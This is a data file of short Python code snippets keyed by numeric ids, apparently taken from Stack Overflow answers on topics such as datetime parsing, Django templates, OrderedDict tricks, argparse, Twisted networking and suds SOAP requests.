
s = "20120808111051"
parsed_datetime = datetime.datetime.strptime(s, "%Y%m%d%H%M%S")
</snippet></ROW><ROW><id>11859786</id><snippet>from django.dispatch import receiver
from django.db.models.signals import pre_save

@receiver(pre_save, sender=Item)
def iter_pre_save_handler(sender, instance, **kwargs):
    if not instance.pk:
        instance.slug = slugify(instance.name)
</snippet></ROW><ROW><id>11859866</id><snippet>", ".join(unichr(u) for u in (0x062A, 0x0627, 0x0628))
</snippet></ROW><ROW><id>11859866</id><snippet>u'\u062a, \u0627, \u0628'
</snippet></ROW><ROW><id>11859866</id><snippet>str.join</snippet></ROW><ROW><id>11859921</id><snippet>&gt;&gt;&gt; from collections import OrderedDict as OD
&gt;&gt;&gt; attributes = OD((('brand','asus'), ('os','linux'), ('processor','i5'), ('memory','4G')))
</snippet></ROW><ROW><id>11859921</id><snippet>&gt;&gt;&gt; reverse = OD(attributes.items()[::-1])
</snippet></ROW><ROW><id>11859921</id><snippet>&gt;&gt;&gt; reverse = OD(reversed(attributes.items()))
</snippet></ROW><ROW><id>11859921</id><snippet>list</snippet></ROW><ROW><id>11859921</id><snippet>reversed</snippet></ROW><ROW><id>11859921</id><snippet>OrderedDict</snippet></ROW><ROW><id>11859921</id><snippet>$ python -m timeit "from collections import OrderedDict as OD; attributes = OD((('brand','asus'), ('os','linux'), ('processor','i5'), ('memory','4G')))" "reverse = OD(attributes.items()[::-1])"
10000 loops, best of 3: 54.8 usec per loop
$ python -m timeit "from collections import OrderedDict as OD; attributes = OD((('brand','asus'), ('os','linux'), ('processor','i5'), ('memory','4G')))" "reverse = OD(reversed(attributes.items()))"
10000 loops, best of 3: 54.4 usec per loop
$ python -m timeit "from collections import OrderedDict as OD; attributes = OD((('brand','asus'), ('os','linux'), ('processor','i5'), ('memory','4G')))" "reversed_attributes=OD(reversed(list(attributes.items())))"
10000 loops, best of 3: 54.4 usec per loop
</snippet></ROW><ROW><id>11859921</id><snippet>&gt;&gt;&gt; invert = OD(zip(*zip(*attributes.items())[::-1]))
</snippet></ROW><ROW><id>11859921</id><snippet>&gt;&gt;&gt; invert = OD(map(reversed, attributes.items()))
</snippet></ROW><ROW><id>11859921</id><snippet>$ python -m timeit "from collections import OrderedDict as OD; attributes = OD((('brand','asus'), ('os','linux'), ('processor','i5'), ('memory','4G')));" "invert = OD(zip(*zip(*attributes.items())[::-1]))"
10000 loops, best of 3: 57 usec per loop
$ python -m timeit "from collections import OrderedDict as OD; attributes = OD((('brand','asus'), ('os','linux'), ('processor','i5'), ('memory','4G')));" "invert = OD(map(reversed, attributes.items()))"
10000 loops, best of 3: 56.8 usec per loop
$ python -m timeit "from collections import OrderedDict as OD; attributes = OD((('brand','asus'), ('os','linux'), ('processor','i5'), ('memory','4G')));" "inverted_attributes=OD([reversed(item) for item in attributes.items()])"
10000 loops, best of 3: 55.8 usec per loop
</snippet></ROW><ROW><id>11860085</id><snippet>foo.__doc__</snippet></ROW><ROW><id>11860085</id><snippet>help(foo)</snippet></ROW><ROW><id>11860085</id><snippet>"""</snippet></ROW><ROW><id>11860085</id><snippet>'''</snippet></ROW><ROW><id>11860085</id><snippet>#</snippet></ROW><ROW><id>11860289</id><snippet>if __name__ == "__main__"</snippet></ROW><ROW><id>11860289</id><snippet>if __name__=="__main__"</snippet></ROW><ROW><id>11860561</id><snippet>os.system("ps ux |
grep -i pymol")</snippet></ROW><ROW><id>11860661</id><snippet>import unittest
import random
random_data = random.random()

class TestClass(unittest.TestCase):
    def __init__(self, TestClass):
        unittest.TestCase.__init__(self, 'test_first')
        self.data = random_data

    def test_first(self):
        self.fail(self.data)

    def test_second(self):
        self.fail(self.data)

if __name__ == '__main__':
    unittest.main()
</snippet></ROW><ROW><id>11860694</id><snippet>from django.utils import simplejson
def getTime(request):
if request.method == "GET":
    date_val =  request.GET.get('start_date')                        
    format = '%Y-%m-%d' 
    sd = datetime.datetime.strptime(date_val, format)
    sql_qw = MeasurementTest.objects.filter(start_date = sd)        
    results = [{'start_time': str(date.start_time), 'id_start_time':date.start_time} for date in sql_qw]
    print results
    response_var = simplejson.dumps(results)

return HttpResponse(response_var, mimetype="application/json")
</snippet></ROW><ROW><id>11860694</id><snippet>data</snippet></ROW><ROW><id>11860694</id><snippet>var request = $.ajax({
  url: "/getTime/",
  type: "GET",
  data: {start_date : value},         
  dataType: "json",
  success: function(data) {               
    //Popluate combo here by unpacking the json
    data[0];  // This is the first element of the array sent by the server
  }
});
</snippet></ROW><ROW><id>11860694</id><snippet>for</snippet></ROW><ROW><id>11860694</id><snippet>each</snippet></ROW><ROW><id>11861021</id><snippet>from functools import wraps

def convert_orc(f):
    @wraps(f)
    def wrapper(self, opponent, *args, **kwargs):
        if isinstance(Snaga, orc):
            raise DeprecationWarning(...)
            return f(self, convert_to_urukhai(opponent), *args, **kwargs)
        else:
            return f(self, opponent, *args, **kwargs)
    return wrapper

class Warrior():
    @convert_orc
    def slash_orc(self, opponent, sword, shield):
       ...

    @convert_orc
    def hack_orc(self, opponent, warhammer):
       ...
</snippet></ROW><ROW><id>11861021</id><snippet>opponent</snippet></ROW><ROW><id>11861645</id><snippet>Cache-control</snippet></ROW><ROW><id>11861660</id><snippet>unicode</snippet></ROW><ROW><id>11861660</id><snippet>&gt;&gt;&gt; unicode(10)
u'10'
</snippet></ROW><ROW><id>11861660</id><snippet>unicode</snippet></ROW><ROW><id>11861660</id><snippet>.decode</snippet></ROW><ROW><id>11861660</id><snippet>'hex'</snippet></ROW><ROW><id>11861660</id><snippet>&gt;&gt;&gt; unicode('10', encoding='hex')
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
TypeError: decoder did not return an unicode object (type=str)
</snippet></ROW><ROW><id>11861661</id><snippet>class MyModel(ndb.Model):
category = ndb.StringProperty(repeated=True)
</snippet></ROW><ROW><id>11861954</id><snippet>import orange
</snippet></ROW><ROW><id>11861954</id><snippet>import Orange
</snippet></ROW><ROW><id>11861954</id><snippet>import Orange
</snippet></ROW><ROW><id>11861954</id><snippet>import orange, orngTest, orngStat, orngTree
</snippet></ROW><ROW><id>11861964</id><snippet>import argparse                                                             
parser = argparse.ArgumentParser()                                             
parser.add_argument("cmd", help="Execute a command",                           
                    action="store", nargs='*')                                 
args = parser.parse_args()                                                     
if args.cmd:                                                                   
    cmd, name = args.cmd                                                       
    print "'%s' was '%s'-ed to the list of names." % (name, cmd)               
else:                                                                          
    print "Just executing the program baby."                                   
</snippet></ROW><ROW><id>11861964</id><snippet>$ python g.py add peter
'peter' was 'add'-ed to the list of names.

$ python g.py del peter
'peter' was 'del'-ed to the list of names.

$ python g.py 
Just executing the program baby.
</snippet></ROW><ROW><id>11862034</id><snippet>from fabric.api import run
from fabric.tasks import execute


def do_something():
    run("echo $RANDOM")

if __name__ == "__main__":
    execute(do_something, hosts=["username@host"])
</snippet></ROW><ROW><id>11862285</id><snippet>list.__str__</snippet></ROW><ROW><id>11862285</id><snippet>repr</snippet></ROW><ROW><id>11862285</id><snippet>&gt;&gt;&gt; print "\x11"
�
&gt;&gt;&gt; print ["\x11"]
['\x11']
&gt;&gt;&gt; print repr("\x11")
'\x11'
</snippet></ROW><ROW><id>11862285</id><snippet>repr</snippet></ROW><ROW><id>11862697</id><snippet>edit_profile.html</snippet></ROW><ROW><id>11862697</id><snippet>home.html</snippet></ROW><ROW><id>11862697</id><snippet>if</snippet></ROW><ROW><id>11862697</id><snippet>&lt;form action="{% url some-action %}"&gt;
{{ form }}
&lt;input type="submit" value="save"/&gt;
&lt;/form
</snippet></ROW><ROW><id>11862697</id><snippet>{% extends "base.html" %}

{% block main %}
{% include "profile_form.html" %}
{% endblock %}
</snippet></ROW><ROW><id>11862697</id><snippet>{% if user_info.name and user_info.last_name %}
{% include "profile_form.html" %}
{% endif %}
</snippet></ROW><ROW><id>11862697</id><snippet>{% extend BASE_TEMPLATE %}
</snippet></ROW><ROW><id>11862697</id><snippet>included_form.html</snippet></ROW><ROW><id>11862697</id><snippet>{% if user_info.name and user_info.last_name %}
{% with "included_form.html" as BASE_TEMPLATE %}
   {% include "edit_profile.html" %}
{% endwith %}
{% endif %}
</snippet></ROW><ROW><id>11862697</id><snippet>BASE_TEMPLATE</snippet></ROW><ROW><id>11862697</id><snippet>base.html</snippet></ROW><ROW><id>11862716</id><snippet>li = [(index, k, val) for index, (k, val) in enumerate(d.items())]
</snippet></ROW><ROW><id>11862737</id><snippet>printf</snippet></ROW><ROW><id>11862737</id><snippet>&gt;&gt;&gt; print('%10.2f' % 1.23456)
      1.12
</snippet></ROW><ROW><id>11862737</id><snippet>print('%-10i%.1f' % (kph, mph))
</snippet></ROW><ROW><id>11862852</id><snippet>m = getattr(self, 'mac%d_le' % i).text()
</snippet></ROW><ROW><id>11862931</id><snippet>~/devel_funcs.py</snippet></ROW><ROW><id>11862949</id><snippet>&gt;&gt;&gt; from collections import Counter
&gt;&gt;&gt; my_dict= {10:[23,24,23,23,24],11:[17,23,23,17,24]}
&gt;&gt;&gt; {k: Counter(v) for k, v in my_dict.items()}
{10: Counter({23: 3, 24: 2}), 11: Counter({17: 2, 23: 2, 24: 1})}
</snippet></ROW><ROW><id>11863031</id><snippet>host = host.strip()</snippet></ROW><ROW><id>11863166</id><snippet>class SubclassAttributes(type):
    def __getattr__(cls, name):  # classmethod of instances
        for subclass in cls.__subclasses__():
            if subclass.__name__ == name:
                return subclass
        else:
            raise TypeError('Class {!r} has no subclass '
                            'named {!r}'.format(cls.__name__, name))

class Base(object):
    __metaclass__ = SubclassAttributes

class Derived1(Base): pass
class Derived2(Base): pass

print Base.Derived1  # &lt;class '__main__.Derived1'&gt;
print Base.Derived2  # &lt;class '__main__.Derived2'&gt;
print Base.Derived3  # TypeError: Class 'Base' has no subclass named 'Derived3'
</snippet></ROW><ROW><id>11863226</id><snippet>_cached_func</snippet></ROW><ROW><id>11863226</id><snippet>class SomeClass(object):
    def __init__(self):
        self._cached_func = {}

    def call(self, **kwargs):
        function_name = '{}_{}'.format(self.parms['prefix'], self.parms['name'])

        try:
            func = self._cached_func[function_name]
        except KeyError:            
            file_name =  self.parms['prefix']
            mod_name = 'PACKAGE.{}'.format(file_name)
            module = __import__(mod_name, globals(), locals(), [file_name,])
            func = getattr(module, function_name)
            self._cached_func[function_name] = func

        return func(**kwargs)
</snippet></ROW><ROW><id>11863538</id><snippet>def print_progress(iterable, percent_step=1):
    total = float(len(iterable))
    # or 1 means that iterable has &lt; 100 elems
    abs_step = int((total * percent_step)/100) or 1
    for i, obj in enumerate(iterable):
        if i and not i % abs_step:
             print "{0:.2%} processed".format(i/total)
        yield obj
</snippet></ROW><ROW><id>11863538</id><snippet>percent_step</snippet></ROW><ROW><id>11863538</id><snippet>percent_step</snippet></ROW><ROW><id>11863538</id><snippet>for x in print_progress(my_list):
    # processing
    ...
</snippet></ROW><ROW><id>11863538</id><snippet>len</snippet></ROW><ROW><id>11863538</id><snippet>"select reltuples from pg_class where relname='%s'" % table_name
</snippet></ROW><ROW><id>11863538</id><snippet>def print_progress(iterable, second_step=10):
    total = float(len(iterable))
    import time
    time1 = time.time()
    for i, obj in enumerate(iterable):
        if time.time() - time1 &gt; second_step:
             print "{0:.2%} processed".format(i/total)
             time1 = time.time()
        yield obj
</snippet></ROW><ROW><id>11863593</id><snippet>.vimrc</snippet></ROW><ROW><id>11863593</id><snippet>:</snippet></ROW><ROW><id>11863634</id><snippet>datetime</snippet></ROW><ROW><id>11863675</id><snippet>urlparse.urlparse</snippet></ROW><ROW><id>11863675</id><snippet>urllib.quote</snippet></ROW><ROW><id>11863675</id><snippet>urlparse.unparse</snippet></ROW><ROW><id>11863675</id><snippet>from urlparse import urlparse, urlunparse
from urllib import quote
x = u'http://blahblah.com/Originální-formule'
parsed_url = list(urlparse(x.encode('utf-8')))
parsed_url[2] = quote(parsed_url[2])
urlunparse(parsed_url)
</snippet></ROW><ROW><id>11863675</id><snippet>http://blahblah.com/Origin%C3%A1ln%C3%AD-formule</snippet></ROW><ROW><id>11863714</id><snippet>   mod = imp.load_source("MyModule", "MyModule.py")
   clz = getattr(mod, "MyClassName")
</snippet></ROW><ROW><id>11863853</id><snippet>pypm install scipi
</snippet></ROW><ROW><id>11863860</id><snippet>for every triagle:
    for every cube:
        if triangle intersects cube:
            set cube = full
        else:
            set cube = empty
</snippet></ROW><ROW><id>11864191</id><snippet>data</snippet></ROW><ROW><id>11864191</id><snippet>with open("data") as f:
        lines=[line.strip().split() for line in f]
combinations={}
for combination in lines[1:]:
        key=", ".join([lines[0][i]
                for i in xrange(len(combination))
                if combination[i] != '0'])
        combinations[key]=combinations.setdefault(key, 0)+1
for key, value in combinations.iteritems():
        print value, '\t', key
</snippet></ROW><ROW><id>11864191</id><snippet>import collections

with open("data") as f:
        lines=[line.strip().split() for line in f]

combinations=collections.Counter(
        ", ".join(lines[0][i]
                for i in xrange(len(combination))
                        if combination[i] != '0')
                for combination in lines[1:])

for key, value in combinations.iteritems():
        print value, '\t', key
</snippet></ROW><ROW><id>11864191</id><snippet>import collections

with open("data") as f:
        lines=(line.strip().split() for line in f)
        header=next(lines)
        combinations=collections.Counter(
                ", ".join(header[i]
                        for i in xrange(len(combination))
                                if combination[i] != '0')
                        for combination in lines)
        for key, value in combinations.iteritems():
                print value, '\t', key
</snippet></ROW><ROW><id>11864197</id><snippet>#uses an iterable `seq` to populate a dictionary.
#the function `keyFunc` will be called on each element of seq to generate keys.
#if two elements `a` and `b` have the same key, 
#`compFunc(a,b)` will return which element should belong in the dict.
def make_dict(seq, keyFunc, compFunc):
    d = {}
    for element in seq:
        key = keyFunc(element)
        if key not in d:
            d[key] = element
        else:
            d[key] = compFunc(d[key], element)
    return d

#I've put all your elements in quotes so that it's valid python. 
#You can use whatever types you prefer, 
#as long as the date and name can be used as a key, 
#and the time supports comparison.
NestedList = [
['100', '08/08/2012', '08:00', 'John Smith'], 
['100', '08/09/2012', '09:20', 'John Smith'], 
['100', '08/08/2012', '10:00', 'John Smith'], 
['131', '08/10/2012', '08:00', 'Jane Williams'], 
['131', '08/12/2012', '22:00', 'Jane Williams']
]

#the key is generated from the element's date and name
keyFunc = lambda x: (x[1], x[3])

#prefer the element with the smaller time
compFunc = lambda a,b: a if a[2] &lt; b[2] else b

NewList = make_dict(NestedList, keyFunc, compFunc).values()
NewList.sort() #optional

print NewList
</snippet></ROW><ROW><id>11864197</id><snippet>[
['100', '08/08/2012', '08:00', 'John Smith'], 
['100', '08/09/2012', '09:20', 'John Smith'], 
['131', '08/10/2012', '08:00', 'Jane Williams'], 
['131', '08/12/2012', '22:00', 'Jane Williams']
]
</snippet></ROW><ROW><id>11864750</id><snippet>asciitable.FixedWidth</snippet></ROW><ROW><id>11864750</id><snippet>delimiter='|'</snippet></ROW><ROW><id>11864841</id><snippet>reset</snippet></ROW><ROW><id>11864841</id><snippet>class git.refs.head.HEAD(repo, path='HEAD')</snippet></ROW><ROW><id>11864841</id><snippet>reset(commit='HEAD', index=True, working_tree=False, paths=None, **kwargs)</snippet></ROW><ROW><id>11864883</id><snippet>__contains__</snippet></ROW><ROW><id>11864883</id><snippet>==</snippet></ROW><ROW><id>11864883</id><snippet>__eq__</snippet></ROW><ROW><id>11864883</id><snippet>is</snippet></ROW><ROW><id>11864883</id><snippet>def contains(obj, lst):
   for item in lst:
       if obj == lst: 
          return True
   return False

contains(a, lst)
</snippet></ROW><ROW><id>11864883</id><snippet>==</snippet></ROW><ROW><id>11864883</id><snippet>item</snippet></ROW><ROW><id>11864883</id><snippet>__eq__</snippet></ROW><ROW><id>11864883</id><snippet>is</snippet></ROW><ROW><id>11864973</id><snippet>glob</snippet></ROW><ROW><id>11864973</id><snippet>from glob import glob

pattern = "D:\\report\\shakeall\\*.txt"
filelist = glob(pattern)
</snippet></ROW><ROW><id>11864973</id><snippet>def countwords(fp):
    with open(fp) as fh:
        return len(fh.read().split())

print "There are" ,sum(map(countwords, filelist))), "words in the files."
</snippet></ROW><ROW><id>11865008</id><snippet>import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D

fig = plt.figure()
ax = fig.add_subplot(111, projection='3d')
</snippet></ROW><ROW><id>11865008</id><snippet>ax = Axes3D(fig)</snippet></ROW><ROW><id>11865008</id><snippet>import numpy as np
import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D

fig = plt.figure()
ax = fig.add_subplot(111, projection='3d')

x, y = np.meshgrid(np.linspace(-5., 5., 100), np.linspace(-5., 5., 100))

def zfunc(x, y):
    return np.exp(-(y**2)) * np.cos(3.*x) + np.exp(x**2) * np.cos(3.*y)

z = zfunc(x, y)

ax.plot_surface(x, y, z)

plt.show()
</snippet></ROW><ROW><id>11865008</id><snippet>x=y</snippet></ROW><ROW><id>11865112</id><snippet>g_set_application_name</snippet></ROW><ROW><id>11865112</id><snippet>glib.set_application_name</snippet></ROW><ROW><id>11865112</id><snippet>g_set_prgname</snippet></ROW><ROW><id>11865112</id><snippet>gobject</snippet></ROW><ROW><id>11865112</id><snippet>import ctypes
libglib = ctypes.CDLL('libglib-2.0.so')
libglib.g_set_application_name("Hello World")
</snippet></ROW><ROW><id>11865284</id><snippet>Rock</snippet></ROW><ROW><id>11865284</id><snippet>Player</snippet></ROW><ROW><id>11865284</id><snippet>Game</snippet></ROW><ROW><id>11865284</id><snippet>Rock</snippet></ROW><ROW><id>11865284</id><snippet># Main
game = Game()
game.run()
print("Game ended.")
</snippet></ROW><ROW><id>11865313</id><snippet>import Tkinter, ttk
root = Tkinter.Tk()
tree_view = ttk.Treeview(root, show='headings', columns=('1'))
tree_view.pack()
tree_view.insert('', 'end', values = ('test'))
root.mainloop()
</snippet></ROW><ROW><id>11865315</id><snippet>example8.py
def main(command: ("SQL query", 'option', 'q'), dsn):
    if command:
        print('executing %s on %s' % (command, dsn))
        # ...

if __name__ == '__main__':
    import plac; plac.call(main)
</snippet></ROW><ROW><id>11865315</id><snippet>import argparse
parser = argparse.ArgumentParser()
parser.add_argument("--add", help="Add prefix to string")
args = parser.parse_args()
</snippet></ROW><ROW><id>11865321</id><snippet>{% if bar == foo|add:1 %}
&lt;p&gt;Condition has been met!&lt;/p&gt;
{% endif %}
</snippet></ROW><ROW><id>11865321</id><snippet>{%with newfoo=foo|add:1 %}
  {% if bar == newfoo %}
  &lt;p&gt;Condition has been met!&lt;/p&gt;
  {% endif %}
{%endwith%}
</snippet></ROW><ROW><id>11865599</id><snippet>self.tableWidget.item().text()</snippet></ROW><ROW><id>11865599</id><snippet>decode</snippet></ROW><ROW><id>11865599</id><snippet>self.tableWidget.item(row, col).text().encode('utf8')
</snippet></ROW><ROW><id>11865616</id><snippet>skt.send('\x12\r')
</snippet></ROW><ROW><id>11865616</id><snippet>bytes.fromhex</snippet></ROW><ROW><id>11865616</id><snippet>skt.send(b'\x12\r')
skt.send(bytes.fromhex('12 0d'))
</snippet></ROW><ROW><id>11865616</id><snippet>bytearray</snippet></ROW><ROW><id>11865616</id><snippet>skt.send(bytearray([0x02, 0x03, 0x00, 0x00, 0x05]))
</snippet></ROW><ROW><id>11865867</id><snippet>import glob</snippet></ROW><ROW><id>11865867</id><snippet>glob.glob</snippet></ROW><ROW><id>11865867</id><snippet>from glob import glob</snippet></ROW><ROW><id>11865867</id><snippet>glob.glob</snippet></ROW><ROW><id>11865867</id><snippet>glob</snippet></ROW><ROW><id>11865993</id><snippet>from foo import * 
</snippet></ROW><ROW><id>11865993</id><snippet>__all__</snippet></ROW><ROW><id>11865993</id><snippet>foo</snippet></ROW><ROW><id>11865993</id><snippet>from socket import *</snippet></ROW><ROW><id>11865993</id><snippet>timeout</snippet></ROW><ROW><id>11865993</id><snippet>timeout</snippet></ROW><ROW><id>11865993</id><snippet>from socket import *</snippet></ROW><ROW><id>11865993</id><snippet>socket</snippet></ROW><ROW><id>11865993</id><snippet>socket</snippet></ROW><ROW><id>11865993</id><snippet>try:
    # socketstuff
except timeout:
    print 'caught a timeout'
</snippet></ROW><ROW><id>11865993</id><snippet>import *</snippet></ROW><ROW><id>11865993</id><snippet># a.py
def foo():
    print "this is a's foo function"

# b.py
def foo():
    print "this is b's foo function"

# yourcode.py
from a import *
from b import *
foo()
</snippet></ROW><ROW><id>11865993</id><snippet>yourcode.py</snippet></ROW><ROW><id>11865993</id><snippet>import socket
from socket import AF_INET, SOCK_DGRAM

def main():
    client_socket = socket.socket(AF_INET, SOCK_DGRAM)
    client_socket.settimeout(1)
    server_host = 'localhost'
    server_port = 1234
    while(True):
        client_socket.sendto('Message', (server_host, server_port))
        try:
            reply, server_address_info = client_socket.recvfrom(1024)
            print reply
        except socket.timeout:
            #more code
</snippet></ROW><ROW><id>11866596</id><snippet>ctrl-c</snippet></ROW><ROW><id>11866596</id><snippet>dataReceived</snippet></ROW><ROW><id>11866596</id><snippet>reactor.stop</snippet></ROW><ROW><id>11866596</id><snippet>dataReceived</snippet></ROW><ROW><id>11866596</id><snippet>gotProtocol</snippet></ROW><ROW><id>11866596</id><snippet>raw_input</snippet></ROW><ROW><id>11866596</id><snippet>quit</snippet></ROW><ROW><id>11866596</id><snippet>ctrl-c</snippet></ROW><ROW><id>11866596</id><snippet>#!/usr/bin/env python
#-*- coding: utf-8 -*-
from twisted.internet.protocol import Protocol,Factory
from twisted.internet.endpoints import TCP4ServerEndpoint,TCP4ClientEndpoint
from twisted.internet import reactor
import thread

class echoProtocol(Protocol):
    def dataReceived(self,data):
        self.transport.write(data+"\n - Server")

class echoFactory(Factory):
    def buildProtocol(self,addr):
        print addr.host
        return echoProtocol()

class clientProtocol(Protocol):
    def sendMessage(self,message):
        self.transport.write(message)
    def dataReceived(self,data):
        print data

class clientFactory(Factory):
    def buildProtocol(self,addr):
        return clientProtocol()

def messageLoop(p):
    text=raw_input("")
    p.sendMessage(text)
    reactor.callLater(1, messageLoop, p)

def connectedProtocol(p):
    thread.start_new_thread(messageLoop, p)

def shutdown(ignored):
    reactor.stop()

if __name__ == '__main__':
    choice=raw_input("Server?[y/n]")
    if choice.lower()=="y":
        TCP4ServerEndpoint(reactor,44554).listen(echoFactory())
        reactor.run()
    else:
        TCP4ClientEndpoint(reactor,"127.0.0.1",44554).connect(clientFactory()).addCallback(messageLoop).addErrback(shutdown)
        reactor.run()
</snippet></ROW><ROW><id>11866709</id><snippet>for line in codecs.open("filename", "rt", "utf32"):
    print line
</snippet></ROW><ROW><id>11866709</id><snippet>codecs</snippet></ROW><ROW><id>11866711</id><snippet>def try_match(m, re_match=re.compile(r'sldkjlsdjf').match):
    return re_match(m)
</snippet></ROW><ROW><id>11866711</id><snippet>try_match = lambda m, re_match=re.compile(r'sldkjlsdjf').match: re_match(m)
</snippet></ROW><ROW><id>11866711</id><snippet>try_match = re.compile(r'sldkjlsdjf').match
</snippet></ROW><ROW><id>11866793</id><snippet>GatwayReq</snippet></ROW><ROW><id>11866793</id><snippet>&gt;&gt;&gt; it = client.factory.create('ns0:GatewayReq')
&gt;&gt;&gt; it
(GatewayReq){
   SessionId = None
   TerminalId = None
   StoreCode = None
   CashMemoNo = None
   CashMemoDate = None
   InvoiceAmount = None
   TimeStamp = None
   CashierId = None
   MerchantId = None
   SPCReqDtls = 
      (SPCReqDtls){
         SPCNo = None
         SPCAmt = None
      }
   VoucherReqDtls[] = &lt;empty&gt;
   CardReqDtls = 
      (CardReqDtls){
         CardType = None
         CardReq = 
            (CardReq){
               CardNo = None
               TransAmt = None
            }
      }
 }
</snippet></ROW><ROW><id>11866793</id><snippet>&gt;&gt;&gt; it.SessionId = 'blahablhabalh'
&gt;&gt;&gt; it
(GatewayReq){
   SessionId = "blahablhabalh"
   # the rest removed for readability
</snippet></ROW><ROW><id>11866793</id><snippet>&gt;&gt;&gt;&gt; client.service.redeem(it)
</snippet></ROW><ROW><id>11866793</id><snippet>entry1 = client.factory.create('ns0:GatewayReq.ns0:VoucherReqDtls')
&gt;&gt;&gt; entry1
(VoucherReqDtls){
   VoucherType = None
   VoucherReq[] = &lt;empty&gt;
 }
</snippet></ROW><ROW><id>11866793</id><snippet>&gt;&gt;&gt; entry1.VoucherType = 'GV'
&gt;&gt;&gt; entry1.VoucherReq.append([12,34,56])
&gt;&gt;&gt; entry1
(VoucherReqDtls){
   VoucherType = "GV"
   VoucherReq[] = 

      12,
      34,
      56,
 }
&gt;&gt;&gt; entry1.VoucherReq.append(23)
&gt;&gt;&gt; entry1
    (VoucherReqDtls){
       VoucherType = "GV"
       VoucherReq[] = 

      12,
      34,
      56,
      23,
 }

&gt;&gt;&gt; it.VoucherReqDtls.append(entry1)
&gt;&gt;&gt; it
(GatewayReq){
   SessionId = None
   TerminalId = None
   StoreCode = None
   CashMemoNo = None
   CashMemoDate = None
   InvoiceAmount = None
   TimeStamp = None
   CashierId = None
   MerchantId = None
   SPCReqDtls = 
      (SPCReqDtls){
         SPCNo = None
         SPCAmt = None
      }
   VoucherReqDtls[] = 
      (VoucherReqDtls){
         VoucherType = "GV"
         VoucherReq[] = 

            12,
            34,
            56,
            23,
  },
   CardReqDtls = 
      (CardReqDtls){
         CardType = None
         CardReq = 
            (CardReq){
               CardNo = None
               TransAmt = None
            }
      }
  }
</snippet></ROW><ROW><id>11866793</id><snippet>&lt;SOAP-ENV:Header/&gt;
   &lt;ns0:Body&gt;
      &lt;ns1:GatewayReq&gt;
         &lt;ns1:SessionId&gt;
            &lt;ns1:SessionId/&gt;
            &lt;ns1:TerminalId/&gt;
            &lt;ns1:StoreCode/&gt;
            &lt;ns1:CashMemoNo/&gt;
            &lt;ns1:CashMemoDate/&gt;
            &lt;ns1:TimeStamp/&gt;
            &lt;ns1:CashierId/&gt;
            &lt;ns1:VoucherReqDtls&gt;
               &lt;ns1:VoucherType&gt;GV&lt;/ns1:VoucherType&gt;
               &lt;ns1:VoucherReq&gt;12&lt;/ns1:VoucherReq&gt;
               &lt;ns1:VoucherReq&gt;34&lt;/ns1:VoucherReq&gt;
               &lt;ns1:VoucherReq&gt;56&lt;/ns1:VoucherReq&gt;
               &lt;ns1:VoucherReq&gt;23&lt;/ns1:VoucherReq&gt;
            &lt;/ns1:VoucherReqDtls&gt;
            &lt;ns1:VoucherReqDtls&gt;
               &lt;ns1:VoucherType&gt;GV&lt;/ns1:VoucherType&gt;
               &lt;ns1:VoucherReq&gt;12&lt;/ns1:VoucherReq&gt;
               &lt;ns1:VoucherReq&gt;34&lt;/ns1:VoucherReq&gt;
               &lt;ns1:VoucherReq&gt;56&lt;/ns1:VoucherReq&gt;
               &lt;ns1:VoucherReq&gt;23&lt;/ns1:VoucherReq&gt;
            &lt;/ns1:VoucherReqDtls&gt;
         &lt;/ns1:SessionId&gt;
         &lt;ns1:TerminalId/&gt;
         &lt;ns1:StoreCode/&gt;
         &lt;ns1:CashMemoNo/&gt;
         &lt;ns1:CashMemoDate/&gt;
         &lt;ns1:TimeStamp/&gt;
         &lt;ns1:CashierId/&gt;
      &lt;/ns1:GatewayReq&gt;
   &lt;/ns0:Body&gt;
&lt;/SOAP-ENV:Envelope&gt;
</snippet></ROW><ROW><id>11866810</id><snippet>from math import log, floor
def expansion(x, b):
    k = int(floor(log(x) / log(b)))
    d, r = divmod(x / float(b ** k), 1)
    digits = [int(d)]
    for _ in range(k):
        d, r = divmod(b * r, 1)
        digits.append(int(d))
    def rest(b, d, r):
        while r:
            d, r = divmod(b * r, 1)
            yield int(d)
    return digits, rest(b, d, r)
</snippet></ROW><ROW><id>11866810</id><snippet>def expansion(x, b, greedy=True):
    if not greedy:
        m = (floor(b) / (b - 1)) - 1
    k = int(floor(log(x) / log(b)))
    d, r = divmod(x / float(b ** k), 1)
    if not greedy and r &lt; m:
        d, r = d - 1, r + 1
    digits = [int(d)]
    for _ in range(k):
        d, r = divmod(b * r, 1)
        if not greedy and r &lt; m:
            d, r = d - 1, r + 1
        digits.append(int(d))
    def rest(d, r):
        while r:
            d, r = divmod(b * r, 1)
            if not greedy and r &lt; m:
                d, r = d - 1, r + 1
            yield int(d)
    return digits, rest(d, r)
</snippet></ROW><ROW><id>11866958</id><snippet>If</snippet></ROW><ROW><id>11866958</id><snippet>If(c, t1, t2)</snippet></ROW><ROW><id>11866958</id><snippet>c</snippet></ROW><ROW><id>11866958</id><snippet>t1</snippet></ROW><ROW><id>11866958</id><snippet>t2</snippet></ROW><ROW><id>11866958</id><snippet>S</snippet></ROW><ROW><id>11866958</id><snippet>If(c, t1, t2)</snippet></ROW><ROW><id>11866958</id><snippet>S</snippet></ROW><ROW><id>11866958</id><snippet>x, y = Reals('x y')
print If(x &gt; 0, x + 1, y - 1)
</snippet></ROW><ROW><id>11866958</id><snippet>x_next</snippet></ROW><ROW><id>11866958</id><snippet>x+1</snippet></ROW><ROW><id>11866958</id><snippet>location</snippet></ROW><ROW><id>11866958</id><snippet>False</snippet></ROW><ROW><id>11866958</id><snippet>x &gt;= 12</snippet></ROW><ROW><id>11866958</id><snippet>x-1</snippet></ROW><ROW><id>11866958</id><snippet>location</snippet></ROW><ROW><id>11866958</id><snippet>True</snippet></ROW><ROW><id>11866958</id><snippet>x &lt;= 0</snippet></ROW><ROW><id>11866958</id><snippet>x</snippet></ROW><ROW><id>11866958</id><snippet>x_next == If(And(Not(location), x &gt;= 12),
             x+1,
             If(And(location, x &lt;= 0), x-1, x))
</snippet></ROW><ROW><id>11866962</id><snippet>SIGPIPE</snippet></ROW><ROW><id>11866962</id><snippet>close</snippet></ROW><ROW><id>11866962</id><snippet>SIGPIPE</snippet></ROW><ROW><id>11867117</id><snippet>other = ['Other', 'Unknown']                        # Strings denoting non-contries
ids = set(i for i,j in mylist)                      # All ids in the list
known = set(i for i,j in mylist if j not in other)  # Ids of real countries
outlist = [k for k in mylist if k[1] not in other]  # Keep all real countries
